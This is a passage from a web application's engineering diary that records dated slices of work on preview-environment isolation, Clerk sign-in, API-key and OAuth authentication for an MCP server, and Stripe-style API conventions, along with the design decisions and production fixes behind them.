- **Coverage (16 new tests):** `DrizzleReportRepository` round-trips **incl. the exact regression** (insert pending → save clean verdict → re-read → assert `scan_status` persisted — verified to FAIL when `save()` is reverted to `ON CONFLICT DO NOTHING`), `DrizzleIdempotencyStore` (proceed/in_flight/replay/reuse-422), `DrizzleEventOutbox`, `DrizzleScanQueue` (enqueue/listQueued/markRunning/completeScan), and `DrizzleUnitOfWork` commit-last atomicity (commit-together + rollback-all).
- **Test taxonomy → ADR-0046.** The two-tier decision (in-process pglite fast tier below the Neon e2e tier; pglite is the real Postgres engine, not a mock) is recorded as ADR-0046, which clarifies ADR-0019.
- **Packaging note:** adding the pglite peer forked `drizzle-orm` into a second pnpm peer-variant; a plain `pnpm install` re-deduped dependents so typecheck resolves one instance. The lockfile change is committed.

Out of scope (per #52): the pg-boss-backed `ScanWorkQueue` (pg-boss internals against pglite — left to e2e). Worktree `chore/adapter-sql-test-harness`. ScanWorkQueue + a possible shared-migrated-template optimization for test speed are follow-ups.

### 2026-06-15 — Preview data isolation (slice 2/2): per-PR Neon branch + Vercel env injection (#53)

Slice 1 (PR #58) added the inert `R2_KEY_PREFIX` capability. This slice wires the actual isolation as a GitHub Actions workflow (`preview-isolation.yml`), per **ADR-0047**.

- **On PR open/sync/reopen:** create-or-reuse a `preview-pr-<N>` Neon branch forked from prod head (data persists across pushes), fetch its pooled connection URI (masked), upsert git-branch-scoped Vercel env on both projects (`DATABASE_URL`, `SCAN_QUEUE_DATABASE_URL`, `R2_KEY_PREFIX=pr-<N>/`), then trigger a redeploy.
- **On PR close:** delete the Neon branch, remove the branch-scoped Vercel env, and `aws s3 rm` the `pr-<N>/` R2 prefix (tightly scoped — never prod keys).
- **Soft isolation** (operator choice, ADR-0047): prod env stays as the preview fallback; the workflow **fails loud** if branch creation / env injection fails, so a fallback-to-prod is surfaced not silent. Residual: a preview built before the workflow finishes uses prod for that one build until the redeploy.
- **Secret:** reused the Terraform Vercel provider token as the `VERCEL_TOKEN` repo secret (team env-management scope).

Validation is **on the PR itself** — the workflow runs on its own `pull_request` events; iterating the Vercel/Neon API calls via the live run logs. Worktrees: `feat/preview-isolation` (#58, slice 1) + `feat/preview-db-isolation` (slice 2). Merge #58 first so the `R2_KEY_PREFIX` consumer is present.

### 2026-06-16 — Auth epic #54, slice 1a: identity provisioning foundation (ADR-0048)

Kicked off the real-auth epic. The Clerk-integration design was settled via /grill-with-docs + Clerk-docs research and recorded in **ADR-0048** (refines ADR-005): personal `Org` = a real Clerk Organization (1:1, app-created JIT since Clerk doesn't auto-create), Clerk **testing tokens** for e2e, Clerk **restricted mode** for invite-only, webhooks deferred. Cost finding: Clerk bills per Monthly Retained Org (≥1 user) — free <100 active orgs, then ~$1/active-user/mo — documented with a tripwire to revisit (→ Clerk Personal Accounts) near 100 active orgs.

This slice is the **provisioning foundation** — no Clerk wired yet, fully TDD'd:
- **`provisionIdentity` use case** (`packages/application`) — resolves a `ClerkIdentity` → `UploadActor`: if the session has no active org, create a personal Clerk org (via the `ClerkOrgProvisioner` port), then find-or-create the mirrored `User` + `Org` + `Root folder` (via the `IdentityStore` port). Policy in the use case (ADR-0024); I/O behind ports. 4 in-memory tests (has-org / no-org-creates / idempotent / provisioner-failure).
- **`DrizzleIdentityStore`** (`packages/adapters`) — find-or-create per entity against `users`/`orgs`/`folders` (idempotent; handles a `User` already in another org per the shared-pool model). 3 pglite integration tests (reusing the #52 harness): unmirrored→null, create→find round-trip, idempotent re-create.

Inert until **slice 1b** wires it: `@clerk/remix` + sign-in/up + `resolveUploadActor`→session + the real Clerk `createOrganization` provisioner + drop `DEMO_ACTOR` + testing-token e2e + restricted-mode config. Worktree `feat/auth-identity-provisioning`. Tracked by issue #54.

### 2026-06-16 — Auth #54: harden identity provisioning (deferred #60 review items)

Addresses the 🔴/🟡 from the slice-1a (#60) review, before the slice-1b wiring drops `DEMO_ACTOR`:
- **🔴 Root-folder dedup** — added a partial unique index `folders_org_root_slug_uniq` on `(org_id, slug) WHERE parent_id IS NULL` (migration `0002`). The base `(org_id, parent_id, slug)` index is NULLs-distinct so it couldn't dedupe top-level folders; provisioning could otherwise create ghost Root folders. A new pglite test proves the DB now rejects a second Root folder.
- **🟡 Transaction** — `DrizzleIdentityStore.createPersonalIdentity` now runs the User/Org/Root-folder find-or-create inside one `DbContext.run` transaction (all-or-nothing; concurrency-safe via the unique-index upserts).

Deferred to the slice-1b wiring PR (where the provisioning path goes live): collapsing `findByClerk` to fewer queries (negligible — one lookup per provision) and emitting a provisioning domain event (ties to the deferred webhook-sync layer, ADR-0048). Worktree `fix/harden-identity-provisioning`.

### 2026-06-17 — Auth #54, slice 1b-i merged + preview Clerk-key split (ADR-0048)

**Slice 1b-i** (#64) merged: `@clerk/remix` wired — `rootAuthLoader` + `ClerkApp` in `root.tsx`, `/sign-in` + `/sign-up` splat routes, signed-in dashboard. Additive (DEMO_ACTOR still owns upload attribution; the flip is 1b-ii). A real prod bug was caught + fixed pre-merge: `getAuth()` re-authenticates server-side and reads the bare `CLERK_PUBLISHABLE_KEY`, but our contract names it `PUBLIC_CLERK_PUBLISHABLE_KEY` (ADR-0043) → a server `getAuth` wrapper in `auth.server.ts` now injects both keys from `defineEnv()`. Verified end-to-end via a local sign-in against the staging instance.

**Preview Clerk-key split** (this PR, `fix/preview-clerk-staging-keys`): closes the Clerk dimension of preview isolation that ADR-0047 deferred to this track. `envs/prod/main.tf` now instantiates a second `clerk-app` module (`module.clerk_staging`, `env = "staging"`) and splits `PUBLIC_CLERK_PUBLISHABLE_KEY` / `CLERK_SECRET_KEY` by Vercel `target` — **live** keys on `production`, **staging/test** keys on `preview`. So a PR preview authenticates against the test Clerk instance, never the prod user pool (critical before 1b-ii flips `resolveUploadActor` to the live session, which would otherwise mint real prod Orgs from previews). Mechanics: added `clerk_*_staging` TF vars; the `vercel-app` module's env-var object gained an optional `key` so two map entries can emit the same Vercel env-var name on different targets (`key = coalesce(each.value.key, each.key)`); wired `TF_VAR_clerk_*_staging` into the `plan-prod`/`apply-prod` jobs from the new `CLERK_*_STAGING` repo var/secret (both set). Docs reconciled: ADR-0047's "deferred" note superseded, ADR-0048 implementation note added, `docs/infra.md` corrected (the `CLERK_*_STAGING` rows said "staging" env — there is none; they feed the prod composition's preview target). **Apply lands on merge via the Terraform pipeline (ADR-018) — never manually.** Plan diff to review: 2 in-place target updates (prod Clerk vars drop `preview`) + 2 new preview env vars (staging values). Also opened follow-up issue **#65** for the latent app-origin CSP/Trusted-Types vs Clerk incompatibility (inert today — `appHeaders()` only on `/health`). Worktree `fix/preview-clerk-staging-keys`.

### 2026-06-17 — Auth #54, slice 1b-ii: upload attribution (resolveUploadActor → provisionIdentity)

`resolveUploadActor` now resolves a real principal from the Clerk session (ADR-0048): `getAuth(args)` → if signed in **and** the email custom claim is present, call `provisionIdentity` (find-or-create the mirrored User + personal Org + Root folder via `DrizzleIdentityStore` + the real `ClerkBackendOrgProvisioner`) and attribute the upload to that org; otherwise fall back to the seeded `DEMO_ACTOR`. **Still additive** — unauthenticated uploads (incl. the `@smoke` e2e) keep working as DEMO; the flip (drop DEMO_ACTOR + require a session + testing-token e2e) is the next slice. `POST /api/v1/reports` now passes its full `args` to the seam (getAuth needs `request` + `context`); the seam owns seeding its own FK targets, so the route's standalone `ensureDevIdentity()` call moved into the DEMO fallback.

**Email source = custom session-token claim** (operator decision over a backend `users.getUser` fetch): zero extra Clerk API calls on the upload hot path. **Operator prerequisite:** add a custom claim `email = {{user.primary_email_address}}` to the session token on **both** the staging and prod Clerk instances (Dashboard → Sessions → Customize session token). Until then, signed-in uploads safely fall back to DEMO_ACTOR (the seam guards on the claim's presence) rather than 500. Worktree `feat/auth-upload-attribution`. Tracked by issue #54.

### 2026-06-17 — Auth #54, slice 1b-iii (PR-A): authenticated e2e + idempotent provisioner

First half of the "flip" (operator chose to split: prove auth in CI before dropping the safety net). **Additive** — `DEMO_ACTOR` stays; the existing anon `@smoke` still passes.

- **Idempotent provisioner** — `ClerkBackendOrgProvisioner.createPersonalOrg` now reuses the user's existing (oldest) personal org instead of always minting one. This was the deferred slice-1b TODO; it became load-bearing because the e2e mints a session via the Clerk backend (`createSession`) which carries **no active org** → every run would otherwise hit the JIT path and create a duplicate org. Extends the narrow `ClerkOrgApi` with `getOrganizationMembershipList`; 5 fake-backed tests.
- **Authed e2e (`@auth`)** — a new `@smoke @auth` scenario mints a real session JWT for the seeded staging test user via the Clerk **backend REST API** (`createSession` → session token; raw fetch, no `@clerk/backend` dep — operator's "why not JWT?"), sends it as the `__session` cookie, GETs the dashboard and asserts the SSR payload contains the test user's Clerk userId (proves `getAuth` honored the session server-side — distinguishes from the DEMO path, which the upload response alone can't), then uploads → 201. Gated: `playwright.config.ts` grep-excludes `@auth` unless `E2E_CLERK_SECRET_KEY` is set, so local `pnpm e2e` without creds skips it. Wired `E2E_CLERK_SECRET_KEY` (= `CLERK_SECRET_KEY_STAGING`) + `E2E_TEST_USER_EMAIL` (new repo var) into the `e2e.yml` smoke step.

Mechanism validated live against the staging instance before wiring (createSession → token returns a JWT carrying the `email` claim — confirms the operator's session-token customization is live). Next (PR-B, the flip): drop `DEMO_ACTOR`, require a session (anon → 401), rewrite the anon smoke. Worktree `feat/auth-e2e-jwt`. Tracked by issue #54.

### 2026-06-17 — Auth #54, slice 1b-iii (PR-B): the flip — require a session, drop DEMO_ACTOR

`POST /api/v1/reports` and the dashboard `/upload` action now **require a signed-in Clerk session** (ADR-0048). `resolveUploadActor` no longer falls back to `DEMO_ACTOR`: no session → `Unauthenticated` (→ 401, mapper already in `arp-http`); signed-in + email claim → `provisionIdentity` (unchanged); signed-in but missing the email claim → also `Unauthenticated` + a `console.warn` (defensive — the claim is configured on staging + prod). `/upload` routes through the same seam and **redirects anonymous visitors to `/sign-in`**. Removed the now-dead `DEMO_ACTOR`, `ensureDevIdentity`, and the `DEV_ORG/USER/FOLDER` seed rows from the composition root (real uploads provision their own User + personal Org + Root folder, so the FK targets exist without seeding).

e2e: the anonymous smoke (`upload-api.feature`) flipped from "201 + body" to "**401 + `code: unauthenticated`**"; the authenticated 201 path is the `@auth` scenario (PR-A). **Note:** the `@auth` scenario's first real run is this PR's own preview (the PR-A merge deployed to prod, which the e2e skips) — so PR-B's preview is where both the 401 gate AND the authenticated 201 path get confirmed together, pre-merge.

Known follow-up: `docs/api/openapi.yaml` still describes the `apiKey` (bearer, ADR-0008) scheme — accurate for the *future* programmatic path, but the *current* mechanism is the Clerk session (cookie/JWT). The `401` response + "auth required" contract are correct; the scheme detail catches up when API keys land. Worktree `feat/auth-require-session`. Tracked by issue #54.

### 2026-06-17 — Auth #54: app-wide dashboard auth gate (default-protect)

Operator decision: every page on the app origin must require a session **except** `/sign-in`, `/sign-up`, `/health` (and the separate, intentionally-public viewer `view.<domain>`, ADR-0038). Implemented as a **default-protect root-loader gate** (so new pages are protected automatically, not opt-in): `root.tsx`'s `rootAuthLoader` callback redirects to `/sign-in` when `request.auth.userId` is absent and the path isn't in `PUBLIC_PATHS` (`/sign-in`, `/sign-up`, `/health`, prefix-matched for Clerk's path-routed sub-pages). Returning a redirect `Response` from the callback is honored by `rootAuthLoader` (verified: it passes redirects through). Resource routes (`/health`, `/api/v1/reports`, `/internal/scan-drain`) don't render the root, so they're outside the gate and keep their own auth (401 / bearer secret) — `/health` is also allowlisted for clarity. `/` is now gated (was a public signed-out landing). e2e: new `@smoke` `dashboard-auth.feature` — anon `/upload` → 302 `/sign-in`, and `/sign-in` stays 200. The authenticated side is covered by `@auth`. Prod prerequisites resolved en route: Clerk custom-domain DNS verified + deployed (clerk-js now loads), Google social login needs prod custom OAuth creds (dev instances use Clerk's shared creds), and the prod instance Home URL → `app.agranado.com`. Worktree `feat/dashboard-auth-gate`. Tracked by issue #54.

### 2026-06-17 — Prod auth bring-up gotchas + docs sync (#56)

Bringing the merged auth stack live on prod surfaced a string of **dev-instance-vs-prod-instance** Clerk gaps (none were code bugs):
1. **Blank `/sign-in`** — clerk-js wouldn't load from the prod custom Frontend API domain (`clerk.agranado.com` → Cloudflare error 1000) because the prod Clerk instance's custom domain wasn't verified/deployed. Our DNS was already correct (CNAMEs DNS-only, as code). Fixed by re-verifying + deploying the domain in the Clerk dashboard.
2. **Google login → "Missing required parameter: client_id"** — prod (live) Clerk instances don't get Clerk's shared social-OAuth credentials (dev/staging do), so Google needs **custom OAuth creds** (Google Cloud client_id/secret → Clerk). Open until the operator adds them or disables Google; email sign-in works.
3. **Post-login redirect to apex `agranado.com`** — the prod instance Home URL was the apex; set to `https://app.agranado.com`. (Our code sets no redirect, so the instance default governed.)

Verified the gate live on prod: anon `GET /upload` → `302 /sign-in?redirect_url=%2Fupload`, `GET /sign-in` → `200`.

**Docs sync (#56):** refreshed this "Current state" block to the present and reconciled `docs/spec.html` (now **rev 9**) with the reversed/landed decisions — ADR-031 (single Neon `main` branch, no persistent staging; dropped `reports-staging` / staging Redis / "three Clerk envs" / `shared → staging → prod`), ADR-0044 (signed merge commits + 0 required approvals, no linear history, no bot-merge — superseding ADR-025/0035), and the canonical `view.<domain>/<slug>` viewer path. `docs:check` stays green. Deferred (still backlog): extracting ADR-001–030 from `spec.html` into `docs/adr/` files. Worktree `docs/sync-spec-diary`.

---

## 2026-06-19 — Content management feature run + Clerk hygiene (ADR-0049)

Shipped the user-facing **reports & folders management** surface end-to-end, plus the auth/data fix that unblocked it and a config-hygiene ADR.

- **Dashboard + read/write API for reports & folders** (#72–#79): list reports; folders (create/move/rename/delete, block-if-non-empty); per-report move/rename/delete; all via the dashboard UI **and** `/api/v1/reports` + `/api/v1/folders` (list/move + PATCH/DELETE). Pure `arp-http` mappers + RFC-9457 errors throughout. Migrations: `0003` (partial folder slug-uniqueness, excludes soft-deleted), `0004` (`reports_org_updated_idx`).
- **Auth/data fix**: the empty-dashboard incident — `resolveActorForRead` required an active org and the operator's reports were stranded under a **dev-instance** identity after prod moved to the **live** Clerk instance. Fixed `resolveActorForRead` to resolve the personal org read-only (#75) and re-keyed the mirror rows to the live identity. See ADR-0049 + memory `clerk-prod-instance-split`.
- **ADR-0049** (#81): documents the Clerk dev/prod instance separation (prod→live, preview/e2e→dev), the single source of truth (GitHub Actions `CLERK_*_PROD`/`*_STAGING` wired by `envs/prod/main.tf`), the orphaning incident, and hygiene invariants. **#76 closed** (no migration was needed; architecture was already correct).
- **Dashboard search + pagination** (this entry's worktree `feat/dashboard-search`): org-wide, newest-first, paged + title/slug search (`searchReports` use case + `ReportRepository.searchByOrg`, backed by `reports_org_updated_idx`); folder sidebar becomes a filter, folder shown per row.

Open follow-ups: **#80** (`ReportDeleted` event — deferred until an audit/purge consumer lands); per-PR e2e BDD for the new use cases (docs:check passes without them, consistent with prior slices).

---

## 2026-06-19 — App design system foundation (ADR-0050)

Began a visual redesign of `apps/app` (was 100% inline styles). PR1 lands the **foundation**: **Tailwind v4** via `@tailwindcss/vite` (devDep, static CSS — CSP-safe), **CSS-first `@theme` design tokens** in `app/styles/theme.css` (the single re-theme point; light-first, dark-ready via `@theme inline` + `@custom-variant dark`), **self-hosted Inter + JetBrains Mono** woff2 (`public/fonts/`, required by `font-src 'self'`), a thin app-local **component layer** (`app/components/`: Button/Input/Card/Badge/PageShell/AppHeader/EmptyState + `cx`), **Clerk `appearance` theming**, and a root **ErrorBoundary/404**. Biome needed `css.parser.tailwindDirectives` to accept the v4 at-rules. Worktree `feat/design-system-foundation`. Decisions in **ADR-0050**. Next: restyle the dashboard (PR2), then upload + auth + error states (PR3). Out of scope: marketing landing page, dark activation, app-wide CSP (#65).

---

## 2026-06-19 — Visual redesign complete (upload + auth restyled)

Finished the app redesign (ADR-0050). PR2 restyled the dashboard; this PR (PR3,
`feat/restyle-upload-auth`) restyles the **upload page** (PageShell + Card +
Input/Textarea/Button) and centres the **Clerk sign-in/sign-up** cards (themed via
the `appearance` API on ClerkApp). All app screens now use the design-system
components + tokens — no inline styles remain. Behavior unchanged (upload action,
Clerk routing). Out of scope still: marketing landing page, dark activation, app-wide CSP (#65).

---

## 2026-06-19 — API-key authentication for `/api/v1` (ADR-0008/0016 extracted)

First PR of the **AI Report MCP** epic (operator-approved plan; remote HTTP MCP on
Express, thin client over `/api/v1` per ADR-003, with API-key + Clerk-OAuth auth).
This PR ships the **foundation the MCP needs**: programmatic API-key auth on
`/api/v1`, alongside Clerk sessions. Worktree `feat/api-key-auth`.

What landed:
- **`arp_live_`/`arp_test_` keys**, 256-bit random, **HMAC-SHA-256 keyed by a server
  pepper** (`ApiKeyService`, `packages/adapters/src/services/api-key.ts`). Only the
  HMAC is stored; secret shown once. Fail-closed when no pepper is configured.
- **`DrizzleApiKeyRepository`** (the long-modeled `api_keys` table) behind a new
  **`ApiKeyStore`** application port — prefix lookup → constant-time compare →
  reject revoked → bump `last_used_at`; mint/list/revoke for the UI. pglite-tested.
- **`authenticateApiKey`** use case maps a verified key → the same `UploadActor` a
  session yields (org Root folder as the write default, scopes from the key row).
- **Auth seam** (`auth.server.ts`): a Bearer `arp_…` resolves the actor first, else
  falls back to the Clerk session — routes unchanged (Actor contract preserved).
- **`settings.api-keys`** management UI (mint/list/revoke, one-time secret).
- **Infra (CI/CD-applied on merge):** two self-generated `random_password` peppers
  (live for prod, test for previews → a preview key can't verify in prod) + the
  `API_KEY_ENV` label, in `infra/terraform/envs/prod/main.tf`.

**ADRs:** extracted **ADR-0008** (amends the spec: HMAC-SHA-256+pepper not argon2id,
`arp_live_/arp_test_` not `rk_live_*` — rationale: keys are high-entropy random, so
a slow password hash buys nothing and would tax every request) and **ADR-0016**
(scope vocabulary; anomaly detection deferred) into `docs/adr/` — the first two of
the ADR-001–030 backlog to be extracted. Decision log: **own `api_keys` table** over
Clerk's GA managed keys (local verification, no per-request network/billing);
spec's argon2id/`rk_` amended with operator sign-off.

233 unit/integration tests green; typecheck + biome + docs:check clean. Next in the
epic: the Express MCP server scaffold + read tools (PR2).

---

## 2026-06-22 — MCP server: Express scaffold + read tools (ADR-0051)

Second PR of the MCP epic (after #87's API-key auth). Stood up **`apps/mcp`** — a
remote, **stateless Streamable-HTTP** MCP server on **Express** (`@modelcontextprotocol/sdk`
≥1.26, fresh `McpServer` + transport per request), deployed as a **Vercel Node
serverless function** (`api/index.ts` exports the Express app; `vercel.json`
rewrites all paths to it; no framework preset). Worktree `feat/mcp-server-read-tools`.

A **thin HTTP client over `/api/v1`** (ADR-003, the in-process option rejected):
`ApiClient` forwards the caller's `Authorization` (an `arp_` key) to the API and
maps RFC-9457 problems → `isError` tool results. Ships the read tools
**`reports_search`** + **`folders_list`** (domain-prefixed, read-only annotations,
paginated). Write tools + the Clerk-OAuth resource-server layer come next.

The REST-client + tool-mapping logic is **unit-tested** (`apps/mcp/src/**`, added to
the root vitest include — unusual for an app here, justified because the logic is
pure). Infra (CI/CD on merge): `module "vercel_mcp"` (`apps/mcp`, `mcp.<apex>`,
minimal env — only `APP_ORIGIN`; it holds none of the app's secrets) + a `mcp`
CNAME in the shared zone. **ADR-0051** records it all, incl. the deliberate
API-key-passthrough deviation from the MCP spec's token-passthrough rule (accepted
for a single-vendor setup; the OAuth path will be spec-clean).

Verified facts (2026 docs): MCP spec rev **2025-11-25**; Streamable HTTP current
(HTTP+SSE deprecated since 2025-03-26); SDK 1.29.0 resolved (peer `zod ^3.25||^4.0`,
links our zod 4); Vercel Node runs a default-exported Express app. Active worktree:
`feat/mcp-server-read-tools`.

---

## 2026-06-22 — MCP write tools (upload/update/move/delete + folder CRUD)

Third PR of the MCP epic. Added the **write tools** to `apps/mcp` so an agent can
now manage reports end-to-end over MCP: `reports_upload` (multipart create /
re-upload — no Idempotency-Key sent, the API derives one from content per
ADR-0039), `reports_update` (rename), `reports_move`, `reports_delete`, and folder
CRUD `folders_create` / `folders_rename` / `folders_delete`. Worktree
`feat/mcp-write-tools`.

Mechanics: extended `ApiClient` with a shared `request()` helper (JSON vs
multipart bodies; 204 → ok-with-no-body for DELETE), and `registerWriteTools`
with deliberate annotations (CREATE / MUTATE / DESTROY — deletes carry
`destructiveHint`). RFC-9457 errors still map to `isError` results, so e.g. a
non-empty `folders_delete` surfaces the API's block as a readable tool error.
All exercised by unit tests (13 client + 6 tool-mapping = 19 in `apps/mcp/src`).

**Deferred:** un-`@wip`-ing `tests/e2e/features/upload-report-via-mcp.feature`. A
real MCP e2e needs the deployed `mcp.<apex>` + a minted API key in the test env
(an MCP-client + key-minting harness that doesn't exist yet) — better as its own
slice once the server is live, rather than a half-built harness here. The
tool/mapping logic is fully unit-covered in the meantime. Active worktree:
`feat/mcp-write-tools`.

---

## 2026-06-22 — Fix: bundle the MCP function at build time (ESM ERR_MODULE_NOT_FOUND)

After #89 merged, `mcp.agranado.com` deployed but every function invocation
500'd with `ERR_MODULE_NOT_FOUND`. Root cause: `apps/mcp` is `type: module`, so
`@vercel/node` runs it as native ESM (no bundling) and Node's resolver rejects
the extensionless relative imports (`./client`, `../src/app`, …). The static
`public/` landing served fine (200); only the function crashed.

Fix — resolve modules at **build time** rather than patching `.js` extensions
onto TypeScript source (operator's call: "we're using TypeScript, solve it at
build time"). `apps/mcp` now has an **esbuild** build: `src/index.ts` (+ all
relative imports, inlined; deps external) → `dist/server.mjs`; a committed
`api/index.mjs` shim re-exports that bundle as the Vercel function. Source stays
extensionless (matching the bundled rest of the repo). `dist/**` added to Turbo's
build outputs so cache hits restore it. Reproduced the failure locally with Node's
ESM loader and verified the bundled entry loads (`default export is function`).
Worktree `fix/mcp-esm-imports`. ADR-0051 updated with the build-bundling rationale.

---

## 2026-06-22 — MCP OAuth 2.1 resource-server layer (ADR-0051 PR 4)

Final functional slice of the MCP epic. `apps/mcp` is now an **OAuth 2.1 resource
server** so interactive clients (Claude Desktop) can authenticate via Clerk browser
login instead of a pasted API key. Worktree `feat/mcp-oauth`.

Design (settled by a research spike): the spec forbids forwarding the inbound OAuth
token to `/api/v1`, so it's **OAuth-in → session-token-out** — verify the Clerk
OAuth access token (`@clerk/backend` `authenticateRequest({acceptsToken:"oauth_token"})`),
then mint a short-lived Clerk **session** token for that user (the e2e
`mintTestSession` recipe) and forward THAT. `/api/v1`'s existing session path
accepts it → **no API change, no API-key minting, no schema change** (chosen over
the spike's API-key-out: simpler, no key-sprawl). `@clerk/mcp-tools` proved
unnecessary — the RFC-9728 protected-resource metadata is derived from the
publishable key and verification is a thin `@clerk/backend` wrapper.

`/mcp` is now dual-mode: a `Bearer arp_…` key forwards as-is (headless, unchanged);
otherwise verify OAuth → mint session token; no credential → 401 + `WWW-Authenticate`
(discovery). Pure logic unit-tested (credential branching + the session minter +
the pk→auth-server-origin derivation); 260 tests green. The MCP gains its **first
secret** (`CLERK_SECRET_KEY`, split prod-live/preview-dev), fail-closed (unset ⇒
OAuth off). `@clerk/backend ^2.33` added (the `acceptsToken` machine-auth API needs
≥2.x).

**Operator handoff (can't be Terraformed — dashboard click-ops, ADR-017 exception):**
create a Clerk **OAuth application** on the dev + live instances, enable Dynamic
Client Registration, set scopes + the `mcp.<apex>/mcp` resource; then verify with
the Inspector's OAuth mode. Steps in `docs/infra.md`. The live OAuth flow is the
one thing not exercised by CI (needs the Clerk app + a browser). Active worktree:
`feat/mcp-oauth`. Deferred completers (own PR): MCP usage docs, `reports_get`,
spec.html MCP-section reconcile.

### 2026-06-22 — MCP OAuth downstream fix: session-token-out was impossible on prod → forward the OAuth token (`fix/api-accept-oauth-token`)

PR #91's OAuth merged, but the live browser flow failed end-to-end. Debugged with the
operator in real time:
1. *"Couldn't register with the sign-in service"* → **DCR was disabled on the LIVE
   Clerk instance** (only dev had it). Clerk's AS metadata advertised no
   `registration_endpoint`. Operator enabled it on live → DCR then worked.
2. After DCR, the OAuth handshake completed ("account authorized") but the MCP
   returned **502** on every call. Root cause: the session-token-out design
   (`POST /v1/sessions` → `…/tokens`, copied from the e2e recipe) hits an endpoint
   Clerk documents as **"intended only for use in testing, and is not available for
   production instances."** It worked on the dev instance, 502'd on live. Clerk
   documents **no** server-side session-JWT mint for production.

**Fix (Clerk's own recommended pattern):** stop minting a session token; **verify the
OAuth token directly at `/api/v1`** and have the MCP forward it.
- `apps/mcp`: `resolveDownstreamAuthorization`'s OAuth branch now verifies (resource-
  server gate) then **forwards the same token**; dropped `mintSessionToken` + the
  per-user token cache + the 502 path. (34 mcp tests; supertest integration suite
  covers dual-mode auth.)
- `apps/app`: the actor seam (`resolveUploadActor`/`resolveActorForRead`) gains a third
  branch — a forwarded Clerk **OAuth token**, verified via `@clerk/backend`
  `authenticateRequest({ acceptsToken: "oauth_token" })` (added `@clerk/backend ^2.33`;
  the bundled `@clerk/remix@4` ships backend 1.x which lacks `acceptsToken`). Email comes
  from `users.getUser` (not on the OAuth machine-auth object), org from `findPersonalOrg`,
  then the existing `provisionIdentity`. No `audience` enforced, so the MCP-bound token
  re-verifies at our API (Clerk's supported multi-backend pattern). Seam is boundary glue
  verified live, like `verifyOAuthUser`; `provisionIdentity` stays unit-covered.

This makes the OAuth path a **single-vendor token forward**, same posture as the `arp_`
key path — recorded as an amendment to ADR-0051 (the spec-deviation note now covers both
front doors). No schema/Terraform/env change (`/api/v1` already had the Clerk keys). 267
unit tests + full typecheck green. Worktree `fix/api-accept-oauth-token`; supersedes the
session-token-out half of `feat/mcp-oauth`. Still owed once merged + redeployed: confirm
the live Inspector OAuth round-trip; the deferred completers (MCP usage docs, `reports_get`,
spec.html reconcile).

### 2026-06-22 — MCP OAuth confirmed live + the completers PR (`feat/mcp-completers`)

After #92 merged + redeployed, OAuth works **end-to-end**: the operator added the custom
connector in Claude Desktop → Clerk browser login → connected, and ran live tool calls
(listed + bulk-deleted 37 reports). Both front doors (`arp_` key + OAuth) verified in prod.
Two operator gotchas were the live blockers, both fixed: **DCR had to be enabled on the
LIVE Clerk instance** (only dev had it → AS metadata lacked `registration_endpoint`), and
the **Vercel env-ordering race** (apply-prod sets the Clerk keys ~100s after the merge's
build → needs a redeploy; subsequent merges self-resolve it).

The completers PR closes the epic's loose ends:
- **`reports_get`** — the read tool the original plan listed but PR #88 never shipped. Needed
  a new `GET /api/v1/reports/{slug}` (there was no single-report JSON endpoint): an 8-line
  `getReport` use case (load by slug → org authz → return; mirrors `renameReport` minus the
  write), `getReportToHttp` (summary shape, shared helper with rename), the GET loader on
  `api.v1.reports.$slug.ts` (read actor, no provisioning), the openapi op, and the
  `ApiClient.getReport` + `reports_get` MCP tool (READ_ONLY).
- **MCP usage docs** — `docs/mcp-usage.md` (connect via OAuth connector or API-key/mcp-remote;
  the 10-tool table).
- **Security posture** — researched + recorded in ADR-0051: **audience binding is deliberately
  NOT enforced** (Clerk's OAuth-token `aud` is undocumented — introspection exposes `client_id`,
  no `aud`; enforcing `audience` would likely reject every token and break the flow);
  `authorizedParties` is inapplicable under DCR. Follow-up: decode a real token's `aud`, enforce
  iff it equals the resource. Also memoized the per-request `createClerkClient` (warm-instance).
- **spec.html** — reviewed; its MCP content (Journey 2: LLM → MCP server → API) is product
  vision now realized + consistent with ADR-0051, so no change needed.

**Deferred (logged):** the **dev/preview Clerk OAuth app + DCR** (preview OAuth; not blocking
prod) and **un-`@wip` `upload-report-via-mcp.feature`** (a real MCP BDD e2e still needs a
key-minting harness against the deployed `mcp.<apex>`; the logic is unit-covered meanwhile).
273 unit tests + typecheck + docs:check green. Worktree `feat/mcp-completers`.

### 2026-06-23 — Full Stripe-style API conventions (ADR-0053), worktree `feat/api-stripe-shape`

After ADR-0052 (prefixed ids), the operator chose to align `/api/v1` (+ the MCP) **fully
with Stripe**, not the pragmatic-flat shape — recorded as ADR-0053 (companion to ADR-0040
errors + ADR-0052 ids). A **breaking wire change**, landed atomically (we own the clients):
- **Resource envelope**: every resource is flat snake_case with `object` ("report"/"folder")
  + `livemode` + its prefixed id.
- **List envelope**: `{object:"list", data:[…], has_more}` — replaces `{reports/folders:[…],
  page, page_size, total}`; reports AND folders now use it.
- **Cursor pagination**: `limit` + `starting_after`/`ending_before` (a prefixed id), keyset on
  the UUIDv7 id DESC. **Ordering changed from updated_at-desc to created-desc** (a re-upload no
  longer jumps to top) — the trade-off for a stable, unique cursor. No `total`.
- **`Request-Id: req_…`** header on every response; **`livemode`** from `API_KEY_ENV`.

Layered (one PR): cursor data model (ports/in-memory/searchReports) → keyset Drizzle queries
(report + new folder `searchByOrg`; pglite integration test) → http `resource.ts` envelope +
`WireContext` → routes (`parseCursorParams`/`wireContext`/Request-Id; move returns the report
resource; **dashboard reworked to Prev/Next cursors**) → MCP cursor tools → openapi (List
envelope, object/livemode, cursor params, dropped the unimplemented `dashboard_url`) + ADR-0053
+ glossary. No DB migration (keyset on the existing id PK). 281 unit tests + typecheck +
docs:check + mcp build green. Operator now prefers full Stripe conventions for new endpoints
(memory). Worktree `feat/api-stripe-shape`. **Merged as PR #96** → released (see next entry).

### 2026-06-23 — Post-merge confirmation + wrap-up (worktree `feat/api-mode-enum`)

PR #96 merged (v1.45.0). **Confirmed live on prod**: `Migrate DB (prod)` applied the `0005`
keyset indexes; the MCP→API round-trip returns the full envelope (`{object:"list", data:[{
object:"report", id:"report_…", folder_id:"folder_…", …}], has_more}`); `Request-Id: req_…`
header present; E2E (BDD) green. Nothing broke.

Two follow-ups in this wrap-up PR:
1. **Release-config fix** — the breaking change shipped as v1.45.0 (minor), NOT v2.0.0. Cause:
   `.releaserc.json` custom `releaseRules` are evaluated before the built-in breaking→major
   default and the first **type**-match wins, so a `feat!`/`docs` commit with a `BREAKING
   CHANGE:` footer matched `{type}` and never reached major. Fix: prepend
   `{breaking:true, release:major}`. (The changelog generator is a separate plugin — that's why
   the ⚠ BREAKING CHANGES section appeared anyway.)
